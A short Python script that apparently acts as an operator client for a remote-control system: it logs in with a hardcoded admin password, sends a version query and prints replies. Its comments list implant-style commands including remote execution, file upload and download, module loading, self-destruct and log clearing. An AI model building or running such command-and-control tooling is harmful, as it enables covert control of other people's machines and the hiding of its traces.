from user import User, Message
from time import sleep
import json

#         GET_VER = 1,
#         GET_IP = 2,
#         GET_SELF_LOGS = 3,
#         GET_MODULES = 4

#         C_STOP = 101,
#         C_EXEC = 102,
#         C_UPDATE = 103,
#         C_DOWNLOAD_FILE = 104,
#         C_DOWNLOAD_MODULE = 105,
#         C_START_MODULE = 106,
#         C_UPLOAD_FILE = 107,
#         C_SELF_DESTROY = 108,
#         C_CLEAR_SELF_LOGS = 109

user = User("user-admin", "PutinHuilo", config_file="config2.json")
user.login()

user.send_message(1, command="1")

while True:
    for msg in user.get_messages():
        print(msg.content)
